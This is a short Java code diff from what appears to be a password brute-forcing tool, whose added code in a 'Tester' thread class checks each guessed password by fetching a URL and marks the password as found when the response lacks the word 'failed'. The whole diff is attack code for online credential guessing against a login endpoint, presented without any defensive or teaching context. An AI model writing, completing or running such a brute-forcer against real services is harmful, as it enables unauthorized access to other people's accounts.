@@ -5,6 +5,17 @@ import java.net.URL;
 
 public class Tester extends Thread {
     public Tester(String password, String url){
+        try{
+            if(!getHTML(url).contains("failed")){
+                Bruter.isFound = true;
+                Bruter.password = password;
+                System.out.println("Password found its :"+password);
+            }else{
+                System.out.println("Failed :"+password);
+            }
+        }catch (Exception e){
+
+        }
 
     }
     public static String getHTML(String urlToRead) throws Exception {
